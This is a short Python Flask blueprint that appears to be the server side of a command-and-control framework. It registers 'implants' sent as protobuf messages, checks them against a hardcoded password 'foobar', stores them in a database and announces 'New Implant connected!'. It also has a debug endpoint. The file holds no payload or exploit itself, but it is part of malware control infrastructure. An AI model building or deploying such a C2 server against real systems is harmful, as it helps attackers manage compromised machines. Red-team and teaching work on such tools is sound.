# rpc blueprint

from flask import Blueprint, request , abort 
from implant_pb2 import * 
from database import db
from models import *

rpc = Blueprint("rpc", __name__)

password = "foobar"

@rpc.route("/register", methods=["POST"])
def handle_register():
    register = RegisterImplant()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    if register.Password != password:
        abort(404)
    r = make_implant(register)
    db.session.add(r)
    db.commit()
    print("New Implant connected!")
    return ""
    
    
@rpc.route("/testpb", methods=["POST"])
def handle_pbtest():
    register = RegisterImplant()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    print(register)
    return ""

